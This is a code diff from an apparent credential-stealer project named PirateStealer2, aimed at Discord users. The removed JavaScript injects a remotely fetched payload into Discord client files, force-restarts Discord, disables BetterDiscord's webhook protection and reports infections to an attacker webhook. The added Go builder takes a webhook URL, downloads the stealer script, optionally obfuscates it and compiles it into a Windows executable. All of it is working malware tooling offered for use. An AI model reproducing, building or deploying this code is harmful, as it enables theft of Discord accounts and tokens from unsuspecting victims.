@@ -1,191 +1,258 @@
 
-// Code is shit
-var glob = require("glob");
-const fs = require('fs');
-const https = require('https');
-const { exec } = require('child_process');
-const axios = require('axios');
-const buf_replace = require('buffer-replace');
+package main
 
-const config = {
-    "logout": "%LOGOUT%1",
-    "inject-notify": "%INJECTNOTI%1",
-    "logout-notify": "%LOGOUTNOTI%1",
-    "init-notify":"%INITNOTI%1",
-    "embed-color": %MBEDCOLOR%1,
-    "disable-qr-code": "%DISABLEQRCODE%1"
+import (
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"math/rand"
+	"net/http"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
+
+	"github.com/Minehacker765/PirateStealer2/Builder/logger"
+)
+
+var (
+	webhook string
+	cfg     Config
+	name    string
+)
+
+type Config struct {
+	Platform      []string `json:"platform"`
+	Obfuscate     bool     `json:"obfuscate"`
+	Logout        string   `json:"logout"`
+	InjectNotify  string   `json:"inject-notify"`
+	LogoutNotify  string   `json:"logout-notify"`
+	InitNotify    string   `json:"init-notify"`
+	DisableQrCode string   `json:"disable-qr-code"`
+	EmbedColor    string   `json:"embed-color"`
 }
 
-
-
-
-var LOCAL = process.env.LOCALAPPDATA
-var discords = [];
-var injectPath = [];
-var runningDiscords = [];
-
-
-fs.readdirSync(LOCAL).forEach(file => {
-    if (file.includes("iscord")) {
-        discords.push(LOCAL + '\\' + file)
-    } else {
-        return;
-    }
-});
-
-discords.forEach(function(file) {
-    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
-    glob.sync(pattern).map(file => {
-        injectPath.push(file)
-    })
-    
-});
-listDiscords();
-function Infect() {
-    https.get('https://raw.githubusercontent.com/Minehacker765/PirateStealer2/main/src/Injection/injection', (resp) => {
-        let data = '';
-        resp.on('data', (chunk) => {
-            data += chunk;
-        });
-        resp.on('end', () => {
-            injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%THISFUCKLOL%", "%THISFUCKLOL%1").replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
-                    encoding: 'utf8',
-                    flag: 'w'
-                });
-                if (config["init-notify"] == "true") {
-                    let init = file.replace("index.js", "init")
-                    if (!fs.existsSync(init)) {
-                        fs.mkdirSync(init, 0744)
-                    }
-                }
-                if ( config.logout != "false" ) {
-
-                    let folder = file.replace("index.js", "PirateStealerBTW")
-                    if (!fs.existsSync(folder)) {
-                        fs.mkdirSync(folder, 0744)
-                        if (config.logout == "instant") {
-                            startDiscord();
-                        }
-                    } else if (fs.existsSync(folder) && config.logout == "instant" ){
-                        startDiscord();
-                    }
-                }
-            })
-            
-        });
-    }).on("error", (err) => {
-        console.log(err);
-    });
-};
-
-
-function listDiscords() {
-    exec('tasklist', function(err,stdout, stderr) {
-
-        
-        if (stdout.includes("Discord.exe")) {
-
-            runningDiscords.push("discord")
-        }
-        if (stdout.includes("DiscordCanary.exe")) {
-
-            runningDiscords.push("discordcanary")
-        }
-        if (stdout.includes("DiscordDevelopment.exe")) {
-
-            runningDiscords.push("discorddevelopment")
-        }
-        if (stdout.includes("DiscordPTB.exe")) {
-
-            runningDiscords.push("discordptb")
-        };
-        if (config.logout == "instant") {
-            killDiscord();
-        } else {
-            if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
-                injectNotify();
-            }
-            Infect()
-            pwnBetterDiscord()
-        }
-    })
-
-
-   
-};
-
-function killDiscord() {
-    runningDiscords.forEach(disc => {
-        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
-            if (err) {
-              return;
-            }
-          });
-    });
-    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
-        injectNotify();
-    }
-
-    Infect()
-    pwnBetterDiscord()
-};
-
-function startDiscord() {
-    runningDiscords.forEach(disc => {
-        let path = LOCAL + '\\' + disc + "\\Update.exe --processStart " + disc + ".exe"
-        exec(path, (err) => {
-            if (err) {
-              return;
-            }
-          });
-    });
-};
-function pwnBetterDiscord() {
-    // thx stanley
-    var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
-    if (fs.existsSync(dir)) {
-        var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
-    } else {
-        return;
-    }
-
+func init() {
+	cfg = loadConfig("config.json")
+	logger.Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Obfuscate (WARNING: experimental, always test it before using the grabber, we won't fix bugs you had if you used obfuscation :Instant feature may break often): %s Logout: %s Disable-qr-code: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
+		fmt.Sprint(cfg.Platform)+"\n",
+		fmt.Sprint(cfg.Obfuscate)+"\n",
+		cfg.Logout+"\n",
+		cfg.DisableQrCode+"\n",
+		cfg.InjectNotify+"\n",
+		cfg.LogoutNotify+"\n",
+		cfg.InitNotify+"\n",
+		cfg.EmbedColor+"\n"))
 }
 
-
-function injectNotify() {
-    var fields = [];
-    injectPath.forEach( path => {
-        var c = {
-            name: ":syringe: Inject Path",
-            value: `\`\`\`${path}\`\`\``,
-            inline: !1
-        }
-        fields.push(c)
-    })
-    axios
-	.post("%THISFUCKLOL%1", {
-        "content": null,
-        "embeds": [
-          {
-            "title": ":detective: Successfull injection",
-            "color": config["embed-color"],
-            "fields": fields,
-            "author": {
-              "name": "PirateStealer"
-            },
-            "footer": {
-              "text": "PirateStealer"
-            }
-          }
-        ]
-      })
-	.then(res => {
-	})
-	.catch(error => {
-
-    })
-
+func main() {
+	var webhook string
+	logger.Info("Enter Webhook URL:")
+	fmt.Scanln(&webhook)
+	logger.Info("Enter exe name:")
+	fmt.Scanln(&name)
+	switch {
+	case !strings.Contains(name, ".exe"):
+		name = name + ".exe"
+	}
+	buildPlatform(webhook)
 }
 
+func loadConfig(file string) Config {
+	var config Config
+	cfg, err := os.Open(file)
+	if err != nil {
+		logger.Error(err.Error())
+	}
+	defer cfg.Close()
+
+	jsonP := json.NewDecoder(cfg)
+	jsonP.Decode(&config)
+	return config
+}
+
+func cfgChanges(data []byte) string {
+	d := string(data)
+	replace(d, "%THISFUCKLOL%1", webhook)
+	// Logout
+	switch cfg.Logout {
+	case "instant":
+		d = replace(d, "%LOGOUT%1", "instant")
+	case "delayed":
+		d = replace(d, "%LOGOUT%1", "delayed")
+	case "false":
+		d = replace(d, "%LOGOUT%1", "false")
+	default:
+		d = replace(d, "%LOGOUT%1", "instant")
+	}
+	// DisableQrCode
+	switch cfg.DisableQrCode {
+	case "true":
+		d = replace(d, "%DISABLEQRCODE%1", "true")
+	case "false":
+		d = replace(d, "%DISABLEQRCODE%1", "false")
+	default:
+		d = replace(d, "%DISABLEQRCODE%1", "false")
+	}
+	// InjectNotify
+	switch cfg.InjectNotify {
+	case "true":
+		d = replace(d, "%INJECTNOTI%1", "true")
+	case "false":
+		d = replace(d, "%INJECTNOTI%1", "false")
+	default:
+		d = replace(d, "%INJECTNOTI%1", "false")
+	}
+	// LogoutNotify
+	switch cfg.LogoutNotify {
+	case "true":
+		d = replace(d, "%LOGOUTNOTI%1", "true")
+	case "false":
+		d = replace(d, "%LOGOUTNOTI%1", "false")
+	default:
+		d = replace(d, "%LOGOUTNOTI%1", "false")
+	}
+	// INITNOTI
+	switch cfg.InitNotify {
+	case "true":
+		d = replace(d, "%INITNOTI%1", "true")
+	case "false":
+		d = replace(d, "%INITNOTI%1", "false")
+	default:
+		d = replace(d, "%INITNOTI%1", "false")
+	}
+	// Embed Color
+	switch {
+	case cfg.EmbedColor != "3447704":
+		d = replace(d, "%MBEDCOLOR%1", cfg.EmbedColor)
+	default:
+		d = replace(d, "%MBEDCOLOR%1", "3447704")
+	}
+
+	d = replace(d, "da_webhook", webhook)
+	return d
+}
+
+func replace(s, old, new string) string {
+	return strings.Replace(s, old, new, -1)
+}
+
+func buildPlatform(webhook string) {
+	rand.Seed(time.Now().Unix())
+	for _, platform := range cfg.Platform {
+
+		switch platform {
+		case "windows":
+
+			logger.Info("Starting to compile")
+			// Check for node
+			_, err := exec.Command("node", "-v").Output()
+			if err != nil {
+				logger.Fatal("You must have node installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program. see: https://nodejs.org/en/download/  | Will exit in 5 seconds", err)
+				time.Sleep(5 * time.Second)
+				os.Exit(1)
+			}
+			logger.Info("Installing deps")
+
+			// Install dependencies
+			_, err = exec.Command("npm", "install").Output()
+			if err != nil {
+				logger.Fatal("Please make sure package.json and package-lock.json are in the same folder that the .exe | Will exit in 5 seconds", err)
+				time.Sleep(5 * time.Second)
+				os.Exit(1)
+			}
+			// Check pkg
+			_, err = exec.Command("nexe", "-v").Output()
+			if err != nil {
+				logger.Info("Installing nexe")
+				_, err = exec.Command("npm", "install", "-g", "nexe").Output()
+				if err != nil {
+					logger.Fatal(`Error while installing nexe, "npm install -g nexe", run this command in cmd please. Will exit in 5 seconds`, err)
+					time.Sleep(5 * time.Second)
+					os.Exit(1)
+				}
+			}
+			logger.Info("Building Windows")
+			wincode := getCode("https://raw.githubusercontent.com/Minehacker765/PirateStealer2/main/src/Undetected/index-win.js")
+			err = ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
+			if err != nil {
+				logger.Fatal("Error writing to file", err)
+			}
+			if cfg.Obfuscate {
+				logger.Info("Obfuscating ...")
+				_, err := exec.Command("javascript-obfuscator", "-v").Output()
+				if err != nil {
+					logger.Fatal("Installing javascript-obfuscator", err)
+					_, err = exec.Command("npm", "install", "-g", "javascript-obfuscator").Output()
+					if err != nil {
+						logger.Fatal(`Error while installing javascript-obfuscator, "npm install -g javascript-obfuscator", run this command in cmd please. Will exit in 5 seconds`, err)
+						time.Sleep(5 * time.Second)
+						os.Exit(1)
+					}
+				}
+				out, err := exec.Command("javascript-obfuscator", "index-win.js", "--config", "obf-config.json", "--output", "output.js").Output()
+				if err != nil {
+					logger.Fatal("Error with Obfuscator", err)
+				}
+				logger.Info(fmt.Sprintf(`Out Obf Command: %s`, out))
+				time.Sleep(time.Second)
+				versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1"}
+				v := versions[rand.Intn(len(versions))]
+				t := fmt.Sprintf(`-t %s`, v)
+				logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s output.js`, t, name))
+				_, err = exec.Command("nexe", "-t", v, "-r", "node_modules/", "-o", name, "output.js").Output()
+				if err != nil {
+					logger.Fatal("Error while compiling", err)
+					time.Sleep(5 * time.Second)
+					os.Exit(1)
+				}
+
+				err = os.RemoveAll("index-win.js")
+				err = os.RemoveAll("output.js")
+				if err != nil {
+					logger.Info("Error while removing file", err)
+				}
+
+			} else {
+				time.Sleep(time.Second)
+				versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1"}
+				v := versions[rand.Intn(len(versions))]
+				t := fmt.Sprintf(`-t %s`, v)
+				logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s index-win.js`, t, name))
+				_, err = exec.Command("nexe", "-t", v, "-o", name, "index-win.js").Output()
+				if err != nil {
+					logger.Fatal("Error while compiling", err)
+					time.Sleep(5 * time.Second)
+					os.Exit(1)
+				}
+			}
+			logger.Info("Windows Executable has been built with your webhook")
+			time.Sleep(time.Second * 5)
+
+		}
+	}
+}
+
+func getCode(url string) string {
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		logger.Fatal(err)
+	}
+
+	httpClient := http.Client{
+		Timeout: 5 * time.Second,
+	}
+
+	resp, err := httpClient.Do(req)
+	if err != nil {
+		logger.Fatal(err)
+	}
+	defer resp.Body.Close()
+	r, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		logger.Error(err)
+	}
+	//replace webhook
+	c := cfgChanges(r)
+	return c
+}
